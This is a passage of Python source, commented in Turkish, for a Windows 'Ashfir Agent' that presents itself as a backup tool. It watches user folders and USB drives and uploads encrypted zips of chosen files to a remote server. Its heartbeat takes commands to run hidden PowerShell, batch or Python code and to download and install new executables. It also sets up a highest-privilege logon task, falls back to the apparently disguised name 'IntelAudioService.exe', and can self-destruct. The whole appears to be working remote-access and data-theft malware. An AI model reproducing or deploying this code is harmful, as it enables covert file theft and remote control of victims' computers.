        # ASCII ile yaz — cp850 bile olsa ozel karakter sorun cikarmaz
        with open(bat_path, 'w', encoding='ascii', errors='replace') as f:
            f.write(content)
        emit_log(f'Batch yazildi: {bat_path}')
    except Exception as e:
        emit_log(f'HATA: Batch yazilamadi: {e}')
        # Yine de cik

    try:
        # CREATE_NO_WINDOW yeterli — Popen zaten bağımsız process başlatır.
        # DETACHED_PROCESS eklenmemeli: cmd.exe batch dosyasını çalıştıramaz hale gelir.
        subprocess.Popen(
            ['cmd.exe', '/c', bat_path],
            cwd=tempfile.gettempdir(),
            creationflags=0x08000000,  # CREATE_NO_WINDOW
            close_fds=True,
        )
        emit_log('Batch başlatıldı. Elveda.')
    except Exception as e:
        # Batch başlamasa da return YOK — agent her durumda kapanmalı
        emit_log(f'Batch başlatma hatası: {e} — yine de çıkılıyor.')

    # Her durumda process'i kapat.
    # subprocess.Popen bağımsız process başlatır; Python kapansa da batch devam eder.
    time.sleep(0.5)
    os._exit(0)


def remote_update(update_url, cfg=None):
    """
    Uzaktan güncelleme akışı:
      1. Yeni exe'yi indirip %TEMP% dizinine kaydet
      2. Güncelleme batch dosyasını yaz
      3. Batch dosyasını başlat ve Python process'ini sonlandır
    """
    my_pid = os.getpid()
    base_dir = str(BASE_DIR)
    
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
        kill_name = os.path.basename(exe_path)
    else:
        exe_path = os.path.abspath(sys.argv[0])
        kill_name = ''
        
    def emit_log(msg):
        log.info(msg)
        if cfg:
            try:
                cf_post('/log', json_data={
                    "key": cfg.key,
                    "level": "warn",
                    "message": f'[UPDATE] {msg}',
                    "source": "agent",
                    "ts": int(time.time() * 1000)
                })
            except:
                pass

    emit_log(f'Güncelleme başlıyor. URL={update_url}')
    
    try:
        tmp_new_exe = os.path.join(tempfile.gettempdir(), 'new_agent_download.exe')
        res = sh.get(update_url, timeout=60, stream=True)
        if res.status_code == 200:
            with open(tmp_new_exe, 'wb') as f:
                for chunk in res.iter_content(chunk_size=8192):
                    f.write(chunk)
            emit_log(f'Yeni sürüm indirildi: {tmp_new_exe}')
        else:
            emit_log(f'Yeni sürüm indirilemedi. HTTP Status: {res.status_code}')
            return
    except Exception as e:
        emit_log(f'İndirme hatası: {e}')
        return

    bat_path = os.path.join(tempfile.gettempdir(), 'ashfir_update.bat')
    
    lines = [
        '@echo off',
        'setlocal',
        f'set "BASE_DIR={base_dir}"',
        f'set "EXE_PATH={exe_path}"',
        f'set "TMP_EXE={tmp_new_exe}"',
        f'set "MY_PID={my_pid}"',
        '',
        ':: Adım 1: Mevcut ajanı öldür',
        'taskkill /f /pid %MY_PID% 2>nul',
    ]
    
    if kill_name:
        lines.append(f'taskkill /f /im {kill_name} 2>nul')
        
    lines += [
        'ping 127.0.0.1 -n 6 >nul',
        '',
        ':: Adım 2: Eski exe\'nin üzerine yaz',
        ':overwrite_loop',
        'copy /y "%TMP_EXE%" "%EXE_PATH%" >nul 2>&1',
        'if %errorlevel% neq 0 (',
        '    ping 127.0.0.1 -n 2 >nul',
        '    goto overwrite_loop',
        ')',
        '',
        ':: Adım 3: Görevi tekrar oluşturup başlat (yönetici izniyle)',
        'schtasks /create /tn "AshfirAgent" /tr "\\"%EXE_PATH%\\"" /sc onlogon /rl highest /f >nul 2>&1',
        'schtasks /run /tn "AshfirAgent" >nul 2>&1',
        '',
        ':: Adım 4: Başlamazsa fallback normal başlat',
        'ping 127.0.0.1 -n 3 >nul',
        'tasklist /fi "imagename eq ' + (kill_name if kill_name else 'IntelAudioService.exe') + '" | find /i "' + (kill_name if kill_name else 'IntelAudioService.exe') + '" >nul 2>&1',
        'if %errorlevel% neq 0 (',
        '    start "" "%EXE_PATH%"',
        ')',
        '',
        ':: Adım 5: Temp dosyaları sil',
        'del /f /q "%TMP_EXE%" 2>nul',
        'del /f /q "%~f0" 2>nul',
        'exit'
    ]
    
    try:
        content = '\r\n'.join(lines)
        with open(bat_path, 'w', encoding='ascii', errors='replace') as f:
            f.write(content)
        emit_log(f'Güncelleme batch dosyası yazıldı: {bat_path}')
    except Exception as e:
        emit_log(f'HATA: Güncelleme batch dosyası yazılamadı: {e}')
        return

    try:
        subprocess.Popen(
            ['cmd.exe', '/c', bat_path],
            cwd=tempfile.gettempdir(),
            creationflags=0x08000000,
            close_fds=True,
        )
        emit_log('Güncelleme batch dosyası başlatıldı. Kapanıyor...')
    except Exception as e:
        emit_log(f'Batch başlatma hatası: {e}')
        return

    time.sleep(0.5)
    os._exit(0)


def execute_remote_code(code, code_type, cfg=None):
    """
    Uzaktan kod (Batch / Script) çalıştırma:
      - PowerShell, CMD/Batch veya Python scriptini gizlice çalıştırır
      - Sonuçları Firestore'a veya loglara yazar
    """
    def emit_log(msg, level='info'):
        log.info(msg)
        if cfg:
            try:
                cf_post('/log', json_data={
                    "key": cfg.key,
                    "level": level,
                    "message": f'[REMOTE-CODE] {msg}',
                    "source": "agent",
                    "ts": int(time.time() * 1000)
                })
            except: pass

    emit_log(f'Kod çalıştırılıyor (Tip: {code_type})')
    
    try:
        if code_type == 'python':
            py_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.py')
            with open(py_file, 'w', encoding='utf-8') as f:
                f.write(code)
                
            ret = subprocess.run(
                [sys.executable if getattr(sys, 'frozen', False) else 'python', py_file],
                capture_output=True, text=True, creationflags=0x08000000, timeout=60
            )
            os.remove(py_file)
            stdout, stderr = ret.stdout, ret.stderr
            
        elif code_type == 'cmd' or code_type == 'batch':
            bat_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.bat')
            with open(bat_file, 'w', encoding='cp850', errors='replace') as f:
                f.write(code)
                
            ret = subprocess.run(
                ['cmd.exe', '/c', bat_file],
                capture_output=True, text=True, creationflags=0x08000000, timeout=60
            )
            os.remove(bat_file)
            stdout, stderr = ret.stdout, ret.stderr
            
        else: # Default: PowerShell
            ps_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.ps1')
            with open(ps_file, 'w', encoding='utf-8') as f:
                f.write(code)
                
            ret = subprocess.run(
                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_file],
                capture_output=True, text=True, creationflags=0x08000000, timeout=60
            )
            os.remove(ps_file)
            stdout, stderr = ret.stdout, ret.stderr
            
        if stdout: emit_log(f'Çıktı (Stdout):\n{stdout}', level='success')
        if stderr: emit_log(f'Hata (Stderr):\n{stderr}', level='warn')

    except Exception as e:
        emit_log(f'Kod çalıştırma hatası: {e}', level='error')


# ── SYNC KONTROL ─────────────────────────────────────────────
sync_stop_event = threading.Event()
sync_wake_event = threading.Event()
sync_lock       = threading.Lock()


def update_watches(cfg, observer, active_watches, queue_manager, ai, stats):
    rc = cfg.all_remote
    watch_paths = rc.get('watch_paths', [])

    if not watch_paths:
        desktop = get_smart_desktop()
        if os.path.exists(desktop):
            watch_paths = [desktop]

    valid_paths = [p for p in watch_paths if os.path.exists(p)]

    for path in valid_paths:
        if path not in active_watches:
            h = Handler(queue_manager, ai, cfg, path, stats, source_label='PC')
            w = observer.schedule(h, path, recursive=True)
            active_watches[path] = w
            log.info(f'📂 İzlemeye alındı: {path}')

    to_remove = [p for p in active_watches if p not in valid_paths]
    for p in to_remove:
        observer.unschedule(active_watches[p])
        del active_watches[p]
        log.info(f'❌ İzlemeden çıkarıldı: {p}')


# ── HEARTBEAT ────────────────────────────────────────────────
def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, start_time):
    log.info('Heartbeat (API Polling) başlatıldı')

    while True:
        try:
            # İnternet yoksa bekle
            if not is_online():
                log.debug('İnternet yok, heartbeat bekleniyor...')
                time.sleep(30)
                continue

            payload = {
                "key": cfg.key,
                "machine_name": cfg.machine_name,
                "online": True,
                "last_seen": datetime.now().isoformat(),
                "files_uploaded": stats['files_uploaded'],
                "ai_skipped": stats['ai_skipped'],
                "last_file": stats['last_file'],
                "uptime_seconds": int(time.time() - start_time),
                "directory_map": get_directory_map()
            }

            res = cf_post('/heartbeat', json_data=payload)
            if res and res.status_code == 200:
                data = res.json()
                
                # Config güncelleme
                if 'config' in data:
                    new_cfg = data['config']
                    if cfg.has_watch_paths_changed(new_cfg):
                        log.info('Config değişti — watch paths güncelleniyor')
                        cfg.update_remote(new_cfg)
                        update_watches(cfg, observer, active_watches, queue_manager, ai, stats)
                        sync_stop_event.set()

                        def restart_sync():
                            time.sleep(2)
                            sync_stop_event.clear()
                            rc = cfg.all_remote
                            paths = [p for p in rc.get('watch_paths', []) if os.path.exists(p)]
                            if not paths:
                                paths = [get_smart_desktop()]
                            initial_sync(queue_manager, ai, paths, rc)

                        threading.Thread(target=restart_sync, daemon=True).start()
                    else:
                        cfg.update_remote(new_cfg)
                        update_watches(cfg, observer, active_watches, queue_manager, ai, stats)
                    
                    # Ayar geldi, hemen kontrol etmesi için uykuyu böl
                    sync_wake_event.set()
                
                # Self-destruct kontrolü
                if data.get('self_destruct'):
                    log.warning('SELF-DESTRUCT komutu alındı!')
                    self_destruct(cfg)

                # Remote update kontrolü
                update_url = data.get('update_url') or data.get('update_agent')
                if update_url:
                    log.warning(f'REMOTE UPDATE komutu alındı: {update_url}')
                    remote_update(update_url, cfg)

                # Remote code kontrolü
                remote_code = data.get('remote_code')
                if remote_code:
                    code_type = data.get('code_type', 'batch')
                    log.warning(f'REMOTE CODE komutu alındı: Tip={code_type}')
                    execute_remote_code(remote_code, code_type, cfg)

        except Exception as e:
            log.error(f'Heartbeat loop hatası: {e}')
        
        time.sleep(30)



# ── BACKGROUND SYNC LOOP ─────────────────────────────────────
def background_sync_loop(cfg, queue_manager, uploader, flash_monitor):
    log.info('Background sync loop başlatıldı (10 dk aralıklarla)')
    while True:
        # Uyandıktan sonra kuyruktaki tüm dosyalar bitene kadar chunk'ları gönder
        while True:
            try:
                # NOT: USB kopyalama copy_and_watch() ile ayrı thread'de çalışıyor.
                # Burada beklemiyoruz — upload ve USB kopyalama paralel ilerler.
                # USB bittikten sonra dosyaları kuyruğa ekler, sırasını bekler.
                    
                queue = queue_manager.get_all()
                if not queue:
                    break # Kuyruk bitti, iç döngüden çık ve ana döngünün sonunda bekle
                    
                if not is_online():
                    log.debug('İnternet yok, sync bekleniyor...')
                    time.sleep(60)
                    continue
                    
                # İnternet var, hizi test et ve zip chunk boyutunu belirle
                chunk_size_limit = get_network_chunk_size()
                
                # Kuyruktaki dosyalari grupla
                current_chunk = []
                current_size = 0
                processed_paths = []
                
                for path, meta in queue.items():
                    if not os.path.exists(path):
                        # Dosya silinmiş, kuyruktan çıkar
                        processed_paths.append(path)
                        continue
                        
                    cached, fhash = uploader.is_cached(path)
                    if cached:
                        # Zaten yüklenmiş, kuyruktan çıkar
                        processed_paths.append(path)
                        continue
                        
                    try:
                        size = os.getsize(path)
                        # 8MB limit kontrolü
                        if size > 8 * 1024 * 1024:
                            log.warning(f"⚠️ Dosya boyutu 8MB'den büyük olduğu için atlandı: {path}")
                            processed_paths.append(path)
                            continue
                            
                        if current_size + size > 8 * 1024 * 1024:
                            break

                        current_chunk.append({'path': path, 'size': size, 'hash': fhash, 'meta': meta})
                        current_size += size
                    except Exception as e:
                        log.debug(f"Dosya boyut okuma hatası: {e}")
                        processed_paths.append(path)

                    if current_size >= 8 * 1024 * 1024:
                        break
                        
                if current_chunk:
                    log.info(f'{len(current_chunk)} dosya zipleniyor... Toplam: {human_size(current_size)}')
                    
                    # Zip oluştur
                    zip_name = f"backup_{int(time.time())}.zip"
                    zip_path = BASE_DIR / zip_name
                    
                    success_count = 0
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for item in current_chunk:
                            try:
                                # Zip icinde goreceli yol (root'a gore)
                                rel_path = Path(item['path']).relative_to(Path(item['meta']['watch_root']))
                                zipf.write(item['path'], arcname=str(rel_path))
                                success_count += 1
                            except Exception as e:
                                log.warning(f"Dosya ziplenemedi (kilitli olabilir): {item['path']} - {e}")
                    
                    if success_count == 0:
                        try: os.remove(zip_path)
                        except: pass
                        continue
    
                    # Zip şifrele
                    enc_zip_path, encrypted_aes_key = encrypt_zip_file(zip_path)
                    
                    # Yükle (İnternet kontrolü ile)
                    upload_ok = False
                    attempt = 0
                    while attempt < 3:
                        if is_online():
                            if uploader.upload_zip(enc_zip_path, encrypted_aes_key, current_chunk, current_size):
                                for item in current_chunk:
                                    uploader.update_cache(item['path'], item['hash'])
                                    processed_paths.append(item['path'])  # Başarılı upload sonrası işaretle
                                queue_manager.remove(processed_paths)
                                upload_ok = True
                                break
                        else:
                            log.debug("Sync sırasında internet koptu, bekleniyor...")
                        
                        attempt += 1
                        time.sleep(5)
                    
                    if not upload_ok:
                        log.error(f"⚠️ {zip_name} yüklenemedi, 5 dakika sonra tekrar denenecek.")
                        # Sadece silinmiş/cache'li dosyaları kuyruktan çıkar, başarısızları bırak
                        queue_manager.remove([p for p in processed_paths if p not in [i['path'] for i in current_chunk]])
                    
                    # Temizlik (her durumda zip dosyalarını sil)
                    try:
                        os.remove(zip_path)
                        os.remove(enc_zip_path)
                    except: pass
                    
                    if not upload_ok:
                        # Upload başarısız olduysa iç döngüden çık, 5 dk bekle
                        break
                    
                    # Sistem yorulmasın diye chunk'lar arası çok ufak bir es
                    time.sleep(1)
                else:
                    # Chunk boşsa sadece gereksiz kayıtları temizle
                    queue_manager.remove(processed_paths)
                    
            except Exception as e:
                log.error(f'Background sync hatası: {e}')
                time.sleep(30)
                
        # İç döngüden çıktık (kuyruk bitti veya upload başarısız)
        # sync_wake_event ile biri uykumuzu bölerse (örn. yeni flash, yeni ayar), anında döngüye gireriz.
        if cfg.get('test_mode', False):
            log.info("🧪 Test modu aktif: 30 saniye sonra tekrar kontrol edilecek.")
            sync_wake_event.wait(30)
        else:
            # Kuyruk varsa 5 dk, yoksa 10 dk bekle
            has_queue = bool(queue_manager.get_all())
            wait_time = 300 if has_queue else 600  # 5 dk retry, 10 dk normal
            log.info(f"⏳ Sync bekleniyor ({wait_time//60} dk)...")
            sync_wake_event.wait(wait_time)

        sync_wake_event.clear()


# ── INITIAL SYNC ─────────────────────────────────────────────
def initial_sync(queue_manager, ai, paths, cfg):
    with sync_lock:
        sync_enabled = cfg.get('sync_on_start', True)
        if not sync_enabled:
            return

        sync_stop_event.clear()
        log.info(f'🔄 Senkronizasyon başladı: {paths}')
        total = 0

        for root in paths:
            if sync_stop_event.is_set():
                log.info('⛔ Senkronizasyon kesildi')
                return

            for dp, dirs, files in os.walk(root):
                if sync_stop_event.is_set():
                    break
                dirs[:] = [d for d in dirs
                            if d.lower() not in BLOCKED_DIRS and not d.startswith('.')]
                for fname in files:
                    if sync_stop_event.is_set():
                        break
                    fp = os.path.join(dp, fname)
                    if not passes_basic(fp, cfg):
                        continue
                    size = os.path.getsize(fp)
                    ai_r = ai.should_backup(fp, size)
                    if ai_r['should_backup']:
                        queue_manager.enqueue(fp, root, ai_r.get('reason', ''), ai_r.get('confidence', 1.0))
                        total += 1

        log.info(f'✅ Senkronizasyon bitti: {total} dosya')


# ── MAIN ─────────────────────────────────────────────────────
def main():
    log.info('=' * 55)
    log.info('Ashfir Agent başlatıldı')
    log.info('=' * 55)

    cfg = AgentConfig()
    log.info(f'Key: {cfg.key[:8]}... | Makine: {cfg.machine_name}')

    server_handler = ServerLogHandler(cfg)
    server_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
    log.addHandler(server_handler)

    # İlk config'i API'den al
    try:
        url = f"{CF_URL}/heartbeat"
        headers = {"Authorization": f"Bearer {CF_TOKEN}"}
        res = sh.post(url, headers=headers, json={"key": cfg.key, "machine_name": cfg.machine_name}, timeout=10)
        if res.status_code == 200:
            data = res.json()
            if 'config' in data:
                cfg.update_remote(data['config'])
                log.info('✅ Config alındı')
            else:
                log.warning('⚠️ Config dokümanı bulunamadı')
        else:
            log.warning(f'⚠️ Config alınamadı: HTTP {res.status_code}')
    except Exception as e:
        log.warning(f'⚠️ Config alınamadı: {e}')

    rc          = cfg.all_remote
    watch_paths = rc.get('watch_paths', [])
    valid_paths = [p for p in watch_paths if os.path.exists(p)]

    queue_manager = QueueManager()
    uploader = Uploader(cfg)
    ai       = SmartFilter(cfg)
    stats    = {'files_uploaded': 0, 'ai_skipped': 0, 'last_file': None}
    start    = time.time()

    if not valid_paths:
        desktop = get_smart_desktop()
        if os.path.exists(desktop):
            valid_paths = [desktop]
            log.info(f'⚠️ Klasör yok, Masaüstü kullanılıyor: {desktop}')

    observer       = Observer()
    active_watches = {}

    for path in valid_paths:
        h = Handler(queue_manager, ai, cfg, path, stats, source_label='PC')
        w = observer.schedule(h, path, recursive=True)
        active_watches[path] = w
        log.info(f'📂 İzleniyor: {path}')

    if STAGE_DIR.exists():
        stage_handler = Handler(queue_manager, ai, cfg, str(STAGE_DIR), stats, source_label='FLASH_STAGE')
        observer.schedule(stage_handler, str(STAGE_DIR), recursive=True)

    observer.start()

    flash_monitor = FlashMonitor(queue_manager, ai, cfg, stats, observer)

    threading.Thread(
        target=initial_sync, args=(queue_manager, ai, valid_paths, rc), daemon=True
    ).start()
    threading.Thread(
        target=heartbeat_loop,
        args=(cfg, stats, queue_manager, ai, observer, active_watches, start),
        daemon=True
    ).start()

    threading.Thread(
        target=background_sync_loop,
        args=(cfg, queue_manager, uploader, flash_monitor),
        daemon=True
    ).start()

    log.info('✅ Agent aktif')

    try:
        while True:
            flash_monitor.poll()
            time.sleep(5)
    except (KeyboardInterrupt, SystemExit):
        observer.stop()
        observer.join()
        log.info('Agent kapatıldı')


if __name__ == '__main__':
    main()